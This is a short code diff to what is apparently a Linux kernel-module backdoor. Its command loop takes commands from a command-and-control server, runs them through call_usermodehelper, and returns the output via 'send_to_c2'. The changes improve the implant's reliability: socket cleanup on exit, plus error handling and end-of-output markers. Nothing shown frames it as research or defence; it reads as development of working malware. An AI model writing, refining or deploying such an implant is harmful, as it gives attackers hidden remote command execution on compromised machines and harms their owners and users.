@@ -147,6 +147,11 @@ static int command_loop(void *data) {
 
         if (strcmp(buffer, "exit") == 0) {
             send_to_c2("Shutting down\n--EOF--\n", 20);
+            if (g_sock) {
+                sock_release(g_sock);
+                g_sock = NULL;
+                notify_connection_state(0);
+            }
             do_exit(0);
         }
 
@@ -161,8 +166,11 @@ static int command_loop(void *data) {
         envp[3] = NULL;
 
         ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-        if (ret)
+        if (ret != 0) {
             send_to_c2("(exec error)\n", 13);
+            send_to_c2("--EOF--\n", 8);
+            continue;
+        }
 
         int sent_output = 0;
         f = filp_open(tmp_output_path, O_RDONLY, 0);
@@ -187,7 +195,6 @@ static int command_loop(void *data) {
         if (!sent_output) {
             send_to_c2("(no output)\n", 12);
         }
-
         send_to_c2("--EOF--\n", 8);
     }
     return 0;
